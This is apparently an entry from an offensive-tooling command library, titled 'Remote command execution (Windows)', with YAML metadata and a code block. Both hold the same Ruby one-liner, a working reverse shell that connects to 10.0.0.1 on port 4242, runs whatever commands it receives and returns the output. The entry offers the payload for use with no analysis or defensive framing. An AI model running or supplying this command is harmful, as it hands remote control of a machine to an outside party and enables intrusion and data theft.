---
id: 49a3c7a5-c2da-4039-a144-32655fcc9dc1
name: Remote command execution (Windows)
type: command
executor: bash
data: ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
  io.read}end'
output: null
created_at: '2023-04-06T03:56:24.309636+00:00'
updated_at: '2023-04-10T20:25:24.555565+00:00'
---

# Remote command execution (Windows)

```bash
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
